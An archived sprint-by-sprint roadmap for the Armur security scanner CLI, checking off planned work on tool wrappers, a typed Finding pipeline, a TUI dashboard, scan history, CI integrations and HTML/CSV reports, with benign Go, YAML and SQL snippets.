> **Archived 2026-09-30.** This is the original 59-sprint plan written when the project was
> "Armur Security Agent". It is kept for reference only. Checked boxes record that code was
> written, not that the feature is reachable from the CLI. The current plan is
> [ROADMAP.md](../../ROADMAP.md).

# Armur Security Agent — Improvement Roadmap

Your personal security agent. SAST + DAST + exploit simulation + attack path analysis — all automated.
Built for the era of AI-generated code where automated security validation is essential.

## Release Plan

| Release | Phase | Sprints | What Ships |
|---------|-------|---------|------------|
| **v1.0** | Core Product | 5–14 | Polished CLI + TUI, typed Finding pipeline, zero-config UX, docs, SCA |
| **v2.0** | The Agent Edge | 15–21 | Rebrand, AI layer, sandboxed DAST, exploit sim, attack paths, PR agent, MCP |
| **v2.5** | Distribution & Community | 22–32 | Install everywhere (with public metrics), GitHub App, VS Code, CI/CD, Slack/Teams, SaaS, community, **template ecosystem** |
| **v3.0** | Scanner Breadth | 33–44 | Secrets, SAST, API, compliance, SBOM, supply chain, language tiers, IaC deep, containers |
| **v3.5** | Advanced Capabilities | 45–56 | Observability, SSE, rules marketplace, fuzzing, PII, crypto, binary, threat modeling |
| **v4.0** | Scale & Intelligence | 57–60 | Distributed workers, debt tracker, threat intel, LLM security |

---
## Phase 1: Foundation (DONE) — Sprints 1–4

These sprints established the core infrastructure: tests, error handling, auth, logging,
performance, integrations, and language expansion. All marked complete.

---

### Sprint 1 — Foundation (Make it Trustworthy) [DONE]

#### 1.1 Test Suite
- [x] Create `testdata/` directory with vulnerable code fixtures for each supported language
  - [x] `testdata/go/` — Go files with known vulnerabilities (SQL injection, hardcoded secrets, etc.)
  - [x] `testdata/python/` — Python files with known vulnerabilities
  - [x] `testdata/js/` — JavaScript/TypeScript files with known vulnerabilities
- [x] Write unit tests for every tool wrapper in `internal/tools/`
  - [x] Mock `exec.Command` to avoid requiring tools installed in CI
  - [x] Test happy path (tool runs, results parsed correctly)
  - [x] Test failure path (tool not found, tool exits non-zero, malformed output)
- [x] Write unit tests for result merging/aggregation (`internal/tasks/tasks.go`)
- [x] Write unit tests for CWE mapping logic
- [x] Write unit tests for language detection logic
- [x] Write integration tests for the full scan pipeline using `testdata/` fixtures
- [x] Write API handler tests (`internal/api/handlers.go`)
- [x] Add test coverage reporting (`go test -cover ./...`)
- [x] Enforce minimum 70% test coverage in CI
- [x] Add `go test ./...` to `Makefile`

#### 1.2 Error Propagation
- [x] Audit all occurrences of `results, _ := RunTool()` and replace with proper error handling
- [x] Add `Errors []ScanError` field to the scan result response payload
  - [x] Each `ScanError` should include: tool name, error message, exit code
- [x] Surface tool-not-found errors to the user (e.g., "gosec not found in PATH")
- [x] Ensure a single tool failure never silently nulls out its section of results
- [x] Add error context to all `log.Printf` / `log.Println` calls (include repo URL, tool name, task ID)
- [x] Remove all bare `panic()` calls; replace with graceful error returns

#### 1.3 Input Validation & Security Hardening
- [x] Validate Git URLs before cloning
  - [x] Allowlist `https://` scheme only (block `file://`, `ssh://`, `git://`)
  - [x] Block private/internal IP ranges in resolved hostnames
- [x] Add file size limit for `/api/v1/scan/file` uploads (e.g., 50MB max)
- [x] Sanitize all directory path inputs to prevent path traversal attacks
- [x] Add rate limiting middleware to all API endpoints (e.g., 10 scans/min per IP)
- [x] Validate `task_id` format before Redis lookups (UUID format check)
- [x] Add request body size limit to the Gin server

#### 1.4 Structured Logging
- [x] Replace all `fmt.Println` / `log.Println` with a structured logger (`zerolog` or `zap`)
- [x] Remove all debug `fmt.Println` statements from production code paths
- [x] Add log levels: DEBUG, INFO, WARN, ERROR
- [x] Add `--verbose` / `-v` flag to CLI for debug output
- [x] Include contextual fields in all log entries: `task_id`, `tool`, `repo_url`, `duration_ms`
- [x] Add request/response logging middleware to the API server

#### 1.5 API Authentication
- [x] Implement API key authentication middleware
  - [x] Generate API key on server start (or via config)
  - [x] Require `Authorization: Bearer <key>` header on all endpoints
  - [x] Return `401 Unauthorized` for missing/invalid keys
- [x] Add API key to CLI config (`armur config set api-key <key>`)
- [ ] Document authentication in README and Swagger spec

---

### Sprint 2 — Performance & Architecture [DONE]

#### 2.1 Parallel Tool Execution
- [x] Refactor `RunSimpleScan()` to execute tools concurrently using goroutines + `sync.WaitGroup`
- [x] Refactor `RunAdvancedScans()` similarly
- [x] Use a result channel to collect tool outputs safely
- [x] Add a configurable concurrency limit (env var: `MAX_TOOL_CONCURRENCY`, default: 5)
- [x] Add per-tool timeout (env var: `TOOL_TIMEOUT_SECONDS`, default: 300)
- [ ] Benchmark before/after to document speedup

#### 2.2 Diff / Incremental Scanning
- [x] Add `--diff <base-ref>` flag to `armur scan` (e.g., `--diff HEAD~1`, `--diff main`)
- [x] Implement git diff logic to extract list of changed files
- [x] Pass changed-files list to tool wrappers; skip unchanged files
- [x] Add `changed_files_only` field to the scan API request body
- [ ] Document diff scanning in README

#### 2.3 Plugin System for Custom Tools
- [x] Define plugin interface spec in `.armur.yml`:
  ```yaml
  plugins:
    - name: my-tool
      command: my-tool --json {target}
      output-format: json
      language: go
  ```
- [x] Implement plugin loader that reads `.armur.yml` from the scanned repo root
- [x] Implement generic tool runner that executes plugin command and parses JSON output
- [x] Add plugin result category `custom_tool` in aggregated results
- [ ] Document plugin system with examples in docs

#### 2.4 Project-Level Configuration File
- [x] Support `.armur.yml` in the scanned repository root
- [x] Config options to support:
  - [x] `exclude` — glob patterns for files/dirs to skip
  - [x] `tools.enabled` — explicit tool allowlist
  - [x] `tools.disabled` — explicit tool blocklist
  - [x] `severity-threshold` — minimum severity to report (info/low/medium/high/critical)
  - [x] `fail-on-findings` — exit code 1 if findings exceed threshold (for CI use)
- [ ] Document all config options in README and docs

#### 2.5 Smaller Docker Image
- [x] Refactor `Dockerfile` to use multi-stage builds
- [x] Create language-specific image variants:
  - [x] `armur:go` — Go tools only
  - [x] `armur:python` — Python tools only
  - [x] `armur:js` — JavaScript/TypeScript tools only
  - [x] `armur:full` — all tools (current behavior)
- [ ] Publish image variants to Docker Hub with size documentation
- [x] Use `alpine` base where possible to reduce layer sizes
- [ ] Document image variant selection in README

#### 2.6 Code Quality Cleanup
- [x] Split `utils.go` (758 lines) into focused modules:
  - [x] `format.go` — result formatting and table rendering
  - [x] `report.go` — OWASP/SANS report generation
- [ ] Standardize tool wrapper function signatures across all 18 tool files
- [x] Remove hardcoded paths (e.g., `/armur/repos`); move to config/env vars
- [ ] Fix all `golangci-lint` warnings on the codebase itself

---

### Sprint 3 — Integrations & Adoption [DONE]

#### 3.1 SARIF Output Format
- [x] Implement SARIF 2.1.0 output format for scan results
- [x] Add `--format sarif` flag to `armur scan` CLI command
- [x] Add `format=sarif` query param to API status endpoint
- [x] Map all existing CWE/finding data to SARIF `result`, `rule`, `location` objects
- [ ] Validate output against SARIF schema
- [ ] Add SARIF output example to README
- [ ] Document GitHub Code Scanning upload workflow

#### 3.2 GitHub Actions Integration
- [x] Create `armur-ai/armur-scan-action` GitHub Action repository
- [x] Implement action with inputs:
  - [x] `target` — path to scan (default: `.`)
  - [x] `fail-on-severity` — minimum severity to fail the workflow
  - [x] `output-format` — `sarif`, `json`, or `table`
  - [x] `languages` — comma-separated language filter
- [x] Upload SARIF to GitHub Code Scanning via `github/codeql-action/upload-sarif`
- [ ] Add PR comment with finding summary using GitHub API
- [ ] Publish to GitHub Actions Marketplace
- [ ] Add usage example to main README

#### 3.3 Pre-commit Hook Support
- [x] Create `.pre-commit-hooks.yaml` in repo root
- [x] Implement fast pre-commit scan (staged files only, skip slow tools)
- [ ] Document setup in README:
  ```yaml
  repos:
    - repo: https://github.com/armur-ai/armur-scanner
      hooks:
        - id: armur-scan
  ```
- [x] Add `--staged-only` flag to CLI for pre-commit use case

#### 3.4 Webhook Notifications
- [x] Add `webhook_url` field to scan request payload
- [x] POST scan results to webhook URL on task completion
- [x] Include HMAC signature header for webhook verification
- [x] Add retry logic for failed webhook deliveries (3 retries, exponential backoff)
- [ ] Document webhook payload schema

#### 3.5 GitLab CI Integration
- [x] Create GitLab CI template (`.gitlab-ci.yml` snippet)
- [x] Map SARIF output to GitLab SAST report format
- [x] Document GitLab Security Dashboard integration
- [x] Add GitLab template to docs

---

### Sprint 4 — Language Expansion [DONE]

#### 4.1 Rust Support
- [x] Add `cargo-audit` integration (dependency vulnerability scanning)
- [x] Add `cargo-geiger` integration (unsafe code detection)
- [x] Add `clippy` integration (linting and common mistakes)
- [x] Add Rust file extension detection (`*.rs`, `Cargo.toml`)
- [x] Add Rust to language detection logic
- [x] Add Rust fixtures to `testdata/`
- [ ] Document Rust support in README

#### 4.2 Java / Kotlin Support
- [x] Add `SpotBugs` integration (bug pattern detection)
- [x] Add `PMD` integration (code quality)
- [x] Add `OWASP Dependency-Check` integration (SCA for Java)
- [x] Add Java/Kotlin file extension detection
- [x] Add Java/Kotlin to language detection logic
- [x] Add Java/Kotlin fixtures to `testdata/`
- [ ] Document Java/Kotlin support in README

#### 4.3 Ruby Support
- [x] Add `Brakeman` integration (Rails security scanner)
- [x] Add `bundler-audit` integration (gem vulnerability scanning)
- [x] Add Ruby file extension detection (`*.rb`, `Gemfile`)
- [x] Add Ruby fixtures to `testdata/`

#### 4.4 PHP Support
- [x] Add `PHPCS` with security sniffs integration
- [x] Add `Psalm` integration (static analysis)
- [x] Add PHP file extension detection (`*.php`)
- [x] Add PHP fixtures to `testdata/`

#### 4.5 C / C++ Support
- [x] Add `cppcheck` integration
- [x] Add `Flawfinder` integration (security-focused C/C++ scanner)
- [x] Add C/C++ file extension detection
- [x] Add C/C++ fixtures to `testdata/`

#### 4.6 Infrastructure / IaC Expansion
- [x] Add `hadolint` integration (Dockerfile linting)
- [x] Add `tfsec` integration (Terraform security)
- [x] Add `kics` integration (multi-IaC platform)
- [x] Add `kube-linter` integration (Kubernetes manifest validation)
- [x] Add `kube-score` integration (Kubernetes best practices)
- [x] Detect IaC file types automatically (`*.tf`, `Dockerfile`, `*.yaml` with k8s markers)

#### 4.7 Solidity / Web3 Support
- [x] Add `Slither` integration (Solidity static analyzer)
- [x] Add `Mythril` integration (symbolic execution for smart contracts)
- [x] Add Solidity file extension detection (`*.sol`)
- [x] Add Solidity fixtures to `testdata/`

---

## Phase 2: Core Product (v1.0) — Sprints 5–14

The polished developer experience. After this phase, `armur run` in any project directory
just works — beautiful TUI, typed results, zero-config UX, comprehensive docs, and full SCA.

---

### Sprint 5 — CLI Polish & UX [DONE]

#### 5.1 Embedded Server Mode
- [x] Add `armur serve` command that starts the API server locally
- [x] Auto-detect if a server is already running before starting a new one
- [x] Support `armur scan .` without any prior setup (auto-start server if needed)
- [x] Add `--no-server` flag for users managing the server themselves

#### 5.2 Real-Time Streaming Output
- [x] Stream tool progress to CLI as scan runs (server-sent events or polling)
- [x] Show which tools are currently running with a live spinner per tool
- [x] Show elapsed time per tool
- [x] Display a live finding counter that updates as results come in

#### 5.3 Improved Scan Summary
- [x] Display a summary card at end of scan
- [x] Add `--fail-on-severity <level>` flag (non-zero exit code if findings found)
- [x] Add severity filter flag `--min-severity <level>` to suppress noise

#### 5.4 Scan History Improvements
- [x] Replace JSON file history with SQLite (`~/.armur/history.db`)
- [x] `armur history` — list past scans with timestamps, targets, finding counts
- [x] `armur history show <id>` — show full results of a past scan
- [x] `armur compare <scan-id-1> <scan-id-2>` — diff two scan results (new/fixed findings)
- [x] `armur history clear` — wipe local history

#### 5.5 Command Naming & UX Fixes
- [x] Rename `scan-i` to `scan --interactive` (or make interactive the default with no args)
- [x] Add `armur init` command to create `.armur.yml` in current directory with sane defaults
- [x] Add `armur doctor` command to check which tools are installed and working
- [x] Add shell completion support (`armur completion bash/zsh/fish/powershell`)
- [x] Add `--watch` mode to re-scan on file changes (development workflow)

#### 5.6 Report Generation
- [x] Add `armur report --format html --task <id>` — generate standalone HTML report
  - [x] Include severity distribution chart
  - [x] Include CWE category breakdown
  - [x] Include file-by-file findings
  - [x] Make it self-contained (no external dependencies)
- [ ] Add `armur report --format pdf` — PDF version of the HTML report
- [x] Add `armur report --format csv` — spreadsheet-friendly export

---

### Sprint 6 — Core Engine Overhaul [DONE]

All language-specific tools read the same directory independently; there is no reason to run them
sequentially. Parallelizing cuts scan time by 3–5x for a typical Go project.

#### 6.1 Parallel Tool Execution

- [ ] Refactor `RunSimpleScan` and `RunAdvancedScans` to a concurrent pattern:
  ```go
  type toolResult struct {
      tool    string
      results map[string]interface{}
      err     error
  }
  results := make(chan toolResult, len(tools))
  var wg sync.WaitGroup
  for _, t := range activeTools {
      wg.Add(1)
      go func(t toolRunner) {
          defer wg.Done()
          r, err := t.Run(ctx, dirPath)
          results <- toolResult{t.Name(), r, err}
      }(t)
  }
  wg.Wait()
  close(results)
  ```
- [ ] Use a semaphore (`chan struct{}`) to cap concurrent tool goroutines to `MAX_TOOL_CONCURRENCY`
- [ ] Wrap each tool `exec.Command` in a `context.WithTimeout(ctx, TOOL_TIMEOUT)` so hung tools are killed
- [ ] Merge results from the channel after all goroutines finish (order-independent)
- [ ] Benchmark scan time before and after for a medium Go repo; document in `docs/benchmarks.md`

#### 6.2 Unified `Finding` Type

Replace all `map[string]interface{}` result flowing through the pipeline with a concrete typed struct.
This eliminates hundreds of fragile type assertions scattered across `tasks.go`, `scan.go`, and `utils.go`.

- [ ] Define `internal/models/finding.go`:
  ```go
  type Severity string
  const (
      SeverityCritical Severity = "CRITICAL"
      SeverityHigh     Severity = "HIGH"
      SeverityMedium   Severity = "MEDIUM"
      SeverityLow      Severity = "LOW"
      SeverityInfo     Severity = "INFO"
  )

  type Finding struct {
      ID          string   `json:"id"`              // SHA256 fingerprint (computed)
      Tool        string   `json:"tool"`
      Category    string   `json:"category"`        // security_issues | antipatterns_bugs | etc.
      File        string   `json:"file"`
      Line        int      `json:"line"`
      EndLine     int      `json:"end_line,omitempty"`
      Column      int      `json:"column,omitempty"`
      RuleID      string   `json:"rule_id,omitempty"`
      CWE         string   `json:"cwe,omitempty"`
      OWASP       string   `json:"owasp,omitempty"`
      Severity    Severity `json:"severity"`
      Message     string   `json:"message"`
      Snippet     string   `json:"snippet,omitempty"`      // 3-5 lines of code context
      Remediation string   `json:"remediation,omitempty"` // fix suggestion if tool provides one
  }
  ```
- [ ] Update every tool wrapper in `internal/tools/` to return `([]Finding, error)` instead of `(map[string]interface{}, error)`
- [ ] Update `RunSimpleScan` / `RunAdvancedScans` to aggregate `[]Finding`
- [ ] Update API response serialization to use `[]Finding`
- [ ] Update all CLI display functions (`utils.go`, `scan.go`) to use `Finding` fields directly
- [ ] Write unit tests asserting each tool wrapper's output shape

#### 6.3 Finding Fingerprinting & Deduplication

Multiple tools often report the same issue (e.g. gosec and semgrep both flag the same SQL injection).
Deduplicate before surfacing results to avoid noise.

- [ ] Compute `Finding.ID` as `hex(SHA256(tool + "|" + file + "|" + strconv.Itoa(line) + "|" + ruleID + "|" + message[:64]))`
- [ ] After merging all tool results, group by `(file, line, cwe)`:
  - If two findings share the same `file + line + CWE`, keep the one with more fields populated (prefer remediation hints)
  - Record the de-duplicated finding's ID in the surviving finding's `DuplicateOf []string` field
- [ ] Add deduplication metadata to scan result: `"meta": { "raw_count": 34, "after_dedup": 17, "dupes_removed": 17 }`
- [ ] Write unit tests for deduplication with synthetic overlapping inputs

#### 6.4 Severity Normalization

Each tool uses different severity representations. Normalize all of them to the canonical `Severity` enum at parse time inside each tool wrapper so the rest of the pipeline never needs to handle raw severity strings.

- [ ] Create `internal/tools/severity.go` with `Normalize(raw string) Severity`
- [ ] Add tool-specific normalization rules:
  - `gosec`: `"HIGH"/"MEDIUM"/"LOW"` → direct mapping
  - `bandit`: `"HIGH"/"MEDIUM"/"LOW"` → direct mapping
  - `semgrep`: `"ERROR"` → High, `"WARNING"` → Medium, `"INFO"` → Info
  - `eslint`: numeric `2` → High, `1` → Medium, `0` → Info
  - `trufflehog`: all findings → Critical (credentials are always critical)
  - `gocyclo`: complexity > 20 → High, > 10 → Medium, else Low
  - `checkov`: `"FAILED"` → Medium by default; specific check IDs mapped to higher severity
  - `trivy`: `"CRITICAL"/"HIGH"/"MEDIUM"/"LOW"/"UNKNOWN"` → direct mapping
  - `osv-scanner`: use ecosystem CVSS score bands: ≥9.0 → Critical, ≥7.0 → High, ≥4.0 → Medium, else Low
- [ ] Write unit tests for every normalization branch

#### 6.5 Scan Cancellation

- [ ] Add `DELETE /api/v1/scan/:task_id` endpoint to cancel an in-progress scan
- [ ] Store a `context.CancelFunc` per task in a registry (`sync.Map`) keyed by task ID
- [ ] Cancel endpoint calls the stored `CancelFunc`, which propagates through all tool goroutines via `context.WithCancel`
- [ ] On cancellation: kill running subprocess (if any), clean up temp directories, store `"status": "cancelled"` in Redis
- [ ] CLI: pressing `q` in the scan dashboard calls the cancel endpoint before exiting

---

### Sprint 7 — `armur run`: Flagship TUI Command [DONE]

The primary user-facing goal: a single entry point that replaces `scan`, `scan-i`, and all manual flags.
Running `armur run` with no arguments opens a beautiful full-screen TUI that walks the user through
everything and shows live progress as the scan executes.

#### 7.1 `armur run` Wizard (Multi-Step Setup Form)

The first thing the user sees — a guided setup before the scan begins.

- [x] Add `armur run` as a new top-level Cobra command (additive; does not replace `scan`)
- [x] Implement a multi-step `charmbracelet/huh` form wizard:
  - [x] **Step 1 — Target**: auto-fill current directory if it is a git repo; three options:
    - Current directory (pre-selected when inside a git repo, shown as `./`)
    - Enter a local path (file or directory picker)
    - Enter a remote git repository URL
  - [x] **Step 2 — Scan depth**: "Quick" (simple tool suite, ~30s) vs "Deep" (full advanced suite, ~2–3m)
  - [x] **Step 3 — Language** (skip if auto-detected with >80% confidence): dropdown with Go, Python, JavaScript/TypeScript, Auto-detect
  - [x] **Step 4 — Output**: Text (default), JSON, SARIF — plus toggle "Save report to file"
  - [x] **Step 5 — Confirmation screen**: show summary of choices before scan begins; buttons: "Start Scan" / "Go Back" / "Cancel"
- [x] Pressing Ctrl+C at any wizard step exits cleanly with "Scan cancelled."
- [x] Persist last-used wizard choices to `~/.armur/last_run.json` and pre-fill them on the next `armur run`
- [x] Read `.armur.yml` from current directory (if present) to further pre-fill defaults

#### 7.2 Live Scan Dashboard (Bubbletea Full-Screen TUI)

After the wizard, transition to a full-screen Bubbletea model that shows real-time scan progress.

- [x] Create `cli/internal/tui/` package for all Bubbletea models and messages
- [x] Implement `ScanDashboard` Bubbletea model with the following terminal layout:
  ```
  ╔══════════════════════════════════════════════════════╗
  ║  ARMUR  ·  Scanning: ./my-project  ·  Deep scan     ║
  ╠══════════════════════════════════════════════════════╣
  ║  Tool              Progress          Status  Found  ║
  ║  ──────────────────────────────────────────────────  ║
  ║  semgrep           [██████████] 100%  ✓ Done    14  ║
  ║  gosec             [████░░░░░░]  42%  ⟳ Running  3  ║
  ║  golint            [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ║  staticcheck       [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ║  gocyclo           [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ║  trufflehog        [░░░░░░░░░░]   0%  ○ Queued   -  ║
  ╠══════════════════════════════════════════════════════╣
  ║  Critical: 0  High: 3  Medium: 8  Low: 6  Info: 0  ║
  ║  Elapsed: 0:23                           [q] Quit  ║
  ╚══════════════════════════════════════════════════════╝
  ```
- [x] Use `github.com/charmbracelet/bubbles/progress` for per-tool progress bars
- [x] Use `github.com/charmbracelet/bubbles/spinner` for the currently-running tool indicator
- [x] Each tool row updates in real time: name, progress bar, status icon, finding count
  - Status icons: `○` queued · `⟳` running · `✓` done · `✗` failed · `⚠` skipped (tool not installed)
- [x] Severity counter row in the footer updates as findings arrive
- [x] Elapsed time counter ticks every second
- [x] Press `q` or Ctrl+C to cancel the scan mid-run (sends cancel to server, cleans up, exits)
- [x] Press `p` to pause live updates (freeze screen to read without stopping the scan)
- [x] Degrade gracefully: if terminal is too narrow, collapse to a single-line spinner + counts

#### 7.3 Post-Scan Results Browser (Interactive Viewer)

After scan completion, transition directly to a two-pane interactive results browser without leaving the TUI.

- [x] Implement `ResultsBrowser` Bubbletea model with:
  - **Left pane** — scrollable finding list, sorted by severity desc
  - **Right pane** — detail view of the currently selected finding
- [x] Finding list row: `[SEV]  file/path.go:42  rule-id  Short message truncated...`
- [x] Severity badges color-coded with lipgloss: `[CRIT]` · `[HIGH]` · `[MED]` · `[LOW]` · `[INFO]`
- [x] Keyboard navigation:
  - `↑`/`↓` or `j`/`k` — move through the findings list
  - `Enter` — expand/collapse the right-pane detail view
  - `f` — toggle filter sidebar (multi-select: severity, category, file glob, tool)
  - `s` — cycle sort order: severity desc → file → tool → line number
  - `/` — inline search: filter by substring across file path and message
  - `e` — export current filtered view (JSON or text, prompts for filename)
  - `r` — open report submenu (generate HTML / CSV / Markdown)
  - `q` — quit to shell
- [x] Right-pane detail view shows:
  - File path + line number (highlighted)
  - Rule ID and CWE (if available) as badges
  - Full finding message
  - 5-line code snippet with the offending line highlighted (read from local file if available)
  - Tool name that reported it
  - Remediation hint (if the tool provides one)
- [x] Summary bar above the list: `17 findings · Critical 1  High 5  Medium 8  Low 3 · Showing: all`
- [x] Filter sidebar: checkbox groups for each dimension; updates list in real time as filters change

#### 7.4 Post-Scan Summary Card (Static Output After TUI Exits)

When the user quits the TUI, print a compact lipgloss-styled summary card to stdout that remains visible in the terminal history.

- [x] Print a bordered summary card using `charmbracelet/lipgloss`:
  ```
  ┌────────────────────────────────────────────────┐
  │  Scan Complete — ./my-project (Go, Deep)       │
  │  Duration: 1m 43s  ·  Tools: 5 ok, 0 failed   │
  ├──────────┬──────────┬──────────┬───────────────┤
  │ Critical │   High   │  Medium  │  Low / Info   │
  │    1     │    5     │    8     │     3 / 7     │
  └──────────┴──────────┴──────────┴───────────────┘
  Task ID:  abc-123-def
  Report:   ~/.armur/reports/abc-123-def.json
  Run 'armur history show abc-123-def' to view again.
  ```
- [x] Severity counts colored (red / yellow / green) using lipgloss
- [x] Print only if there were findings; if zero findings: print a green "✓ No issues found." card instead
- [x] If `--fail-on-severity` was set and threshold exceeded: print exit code warning before exiting with code 1

---

### Sprint 8 — Smart Scanning & Zero-Config UX [DONE]

The goal: `armur run` in any project directory just works with no flags or prior setup required.

#### 8.1 Auto-Detect Everything from Context

- [x] On `armur run` with no args, walk up from `cwd` to find the nearest `.git` directory and use that as the scan root
- [x] Auto-detect language from file extension frequency (`.go` files dominant → Go, etc.)
- [x] If a single language is detected with high confidence, skip the language wizard step and show "Language: Go (auto-detected)" in the confirmation
- [x] Handle multi-language repos: if two or more languages are detected, offer "Scan all" or let user pick one from a checkbox list
- [x] Auto-detect `.armur.yml` in the repo root and pre-fill all wizard fields from it

#### 8.2 `.armur.yml` Project Config File

Full support for a repo-level config that controls scan behavior without any CLI flags.

- [x] Define and document the `.armur.yml` schema:
  ```yaml
  scan:
    depth: quick              # quick | deep
    language: go              # override auto-detection; omit for auto
    severity-threshold: medium  # minimum severity to include in output
    fail-on-findings: true    # exit with code 1 if any findings at threshold or above

  exclude:
    - vendor/
    - "**/*_test.go"
    - testdata/
    - "*.pb.go"

  tools:
    disabled:
      - gocyclo               # skip this tool
    timeout: 120              # per-tool timeout in seconds (overrides env var)

  output:
    format: text              # text | json | sarif
    save-to: ./reports/       # directory to auto-save reports after each scan

  plugins:
    - name: my-custom-linter
      command: "my-linter --json {target}"
      output-format: json
      language: go
  ```
- [x] Server reads `.armur.yml` from the cloned/local repo root when executing tasks
- [x] CLI reads `.armur.yml` from cwd to pre-fill wizard defaults
- [x] Config file values are overridden by explicit CLI flags (flag > config > default)

#### 8.3 `armur init` Command

- [x] `armur init` runs a short guided huh form and writes `.armur.yml` to the current directory
- [x] Wizard fields: preferred depth, language override (or auto), severity threshold, paths to exclude
- [x] Output file includes inline YAML comments explaining every field
- [x] If `.armur.yml` already exists: prompt "Overwrite existing config? (y/N)"

#### 8.4 Diff / Incremental Scanning

- [x] Add `--diff <base-ref>` flag to both `armur run` and `armur scan`
- [x] Wizard Step 2.5 (shown only in "Quick" mode): optional "Only scan files changed since [git ref]" input
- [x] Server: after cloning, run `git diff --name-only <base-ref>` to get the changed file list
- [x] Pass changed file list into each tool wrapper; wrappers that support file-level targeting use it
- [x] Tools that cannot target individual files (trufflehog, checkov) scan the full repo regardless
- [x] Add diff metadata to scan result: `"diff_mode": true, "base_ref": "HEAD~1", "files_scanned": 12`
- [x] `--staged-only` flag: pass only git-staged files (for pre-commit use case)

---

### Sprint 9 — `armur doctor` & CLI Completeness [DONE]

#### 9.1 `armur doctor` Command

A self-diagnosis command that checks all prerequisites and reports what is working and what is missing.

- [x] Implement `armur doctor` command
- [x] Checks performed:
  - [x] API server reachable at configured URL (GET `/health`, show version)
  - [x] Redis reachable (server reports Redis status in `/health` response)
  - [x] Docker running (if Docker-based deployment is configured)
  - [x] For each of the 18 bundled tools: binary exists in PATH + print installed version
  - [x] API key configured and accepted (authenticated request to `/api/v1/status/ping`)
  - [x] `.armur.yml` present in cwd (informational only)
- [x] Output format (lipgloss-styled):
  ```
  armur doctor
  ──────────────────────────────────────────────
  ✓  API server    http://localhost:4500  (v1.2.0)
  ✓  Redis         redis://localhost:6379  (pong)
  ✓  API key       configured
  ──────────────────────────────────────────────
  ✓  semgrep       1.45.0
  ✓  gosec         2.18.2
  ✗  gocyclo       NOT FOUND
                   → go install github.com/fzipp/gocyclo/cmd/gocyclo@latest
  ✓  bandit        1.7.5
  ⚠  pylint        3.0.1  (latest: 3.1.0)
  ──────────────────────────────────────────────
  1 tool missing. Fix the issues above to enable full scanning.
  ```
- [x] Color-code: green ✓ / red ✗ / yellow ⚠
- [x] Exit code 0 if server is reachable and all tools found; exit code 1 if anything critical is missing

#### 9.2 SQLite-Backed Scan History

Replace the current JSON file history with a SQLite database for reliable querying and pagination.

- [x] Add `modernc.org/sqlite` dependency (pure Go, no CGo required)
- [x] Initialize `~/.armur/history.db` on first run with schema:
  ```sql
  CREATE TABLE IF NOT EXISTS scans (
      id           TEXT PRIMARY KEY,
      target       TEXT NOT NULL,
      language     TEXT,
      mode         TEXT,
      started_at   DATETIME,
      finished_at  DATETIME,
      status       TEXT,
      critical     INTEGER DEFAULT 0,
      high         INTEGER DEFAULT 0,
      medium       INTEGER DEFAULT 0,
      low          INTEGER DEFAULT 0,
      info         INTEGER DEFAULT 0,
      report_path  TEXT
  );
  ```
- [x] `armur history` — list last 20 scans in a lipgloss-styled table (newest first)
- [x] `armur history --all` — list all scans with pagination (`--page`, `--limit` flags)
- [x] `armur history show <id>` — re-display full results from the saved JSON report file
- [x] `armur history clear` — wipe all rows (ask "Clear all scan history? (y/N)" first)
- [x] `armur compare <id1> <id2>` — diff two scans; show:
  - New findings (in id2 but not id1) highlighted in red
  - Fixed findings (in id1 but not id2) highlighted in green
  - Unchanged findings (in both) in grey
- [x] Auto-save full scan results JSON to `~/.armur/reports/<task-id>.json` after every completed scan
- [x] Insert a history row after every scan (success or failure)

#### 9.3 Shell Completions

- [x] Add `armur completion bash` — print Bash completion script
- [x] Add `armur completion zsh` — print Zsh completion script
- [x] Add `armur completion fish` — print Fish completion script
- [x] Add `armur completion powershell` — print PowerShell completion script
- [x] `armur history show <TAB>` — complete from scan IDs stored in local history DB
- [x] Document how to install completions for each shell in README

#### 9.4 `--watch` Mode

- [x] Add `--watch` flag to `armur run` / `armur scan`
- [x] On file change in the scanned directory (using `fsnotify`), re-run the last scan config automatically
- [x] In watch mode: use compact output (single-line per re-scan, not full-screen TUI)
  - e.g. `[14:32:01] File changed: main.go — re-scanning...`
  - e.g. `[14:32:34] Done. 2 new findings, 0 fixed. (high: 1, medium: 1)`
- [x] Debounce: ignore file changes within 3 seconds of a scan start to avoid re-scan storms
- [x] Exit watch mode cleanly on Ctrl+C

#### 9.5 `armur version` Command

- [x] Add `armur version` command
- [x] Embed at build time via `ldflags`: version tag, git commit hash, build date
- [x] Output:
  ```
  armur v1.2.0 (commit abc1234, built 2026-03-05)
  ```
- [x] `armur version --check` — fetch latest release from GitHub Releases API and compare; print upgrade hint if behind

---

### Sprint 10 — Result Display & Report Generation [DONE]

#### 10.1 Rich Terminal Output (Redesigned Display Layer)

The current display is scattered across `scan.go` and `utils.go` with fragile manual column widths.
Centralize and redesign.

- [x] Create `cli/internal/display/` package with clean public API:
  - `RenderFindingsTable(findings []Finding, opts RenderOpts) string`
  - `RenderSummaryCard(meta ScanMeta) string`
  - `RenderToolErrors(errs []ScanError) string`
- [x] `RenderFindingsTable`:
  - [x] Auto-detect terminal width via `golang.org/x/term` and adjust column widths dynamically
  - [x] Group findings by category; print a bold lipgloss-styled category header before each group
  - [x] Severity column: render as a colored lipgloss badge `[HIGH]` not raw text
  - [x] Truncate long file paths from the left (`...internal/pkg/utils/foo.go`) not from the right
  - [x] Alternate row background shading for readability in long lists
  - [x] Show finding count per category in the group header: `Security Issues (14)`
- [x] `RenderSummaryCard`: lipgloss-bordered card with severity counts (from Sprint 7.4)
- [x] `RenderToolErrors`: yellow warning block listing tool failures at the end of output

#### 10.2 HTML Report Generation

- [x] `armur report html --task <id>` — generate a standalone, self-contained HTML file
- [x] Report sections:
  - [x] Header: scan target, date, duration, tool versions used
  - [x] Executive summary: severity counts + inline SVG donut chart (no JS)
  - [x] CWE category breakdown table with finding counts
  - [x] Per-file findings: grouped by file, each finding as a `<details>` collapsible row
  - [x] Tool errors section: list of skipped/failed tools
  - [x] Methodology section: one-line description of each tool run
- [x] All CSS inlined in `<style>` block; no external CDN references; no JavaScript required
- [x] Write to `~/.armur/reports/<task-id>.html`; print path after generation

#### 10.3 CSV & Markdown Report Generation

- [x] `armur report csv --task <id>` — CSV with columns: ID, Tool, File, Line, Severity, CWE, OWASP, Message
- [x] `armur report markdown --task <id>` — GFM table of findings (ready to paste into a GitHub comment)
- [x] Both accept `--output <path>` to override the default save location

#### 10.4 CI-Friendly Exit Codes & Flags

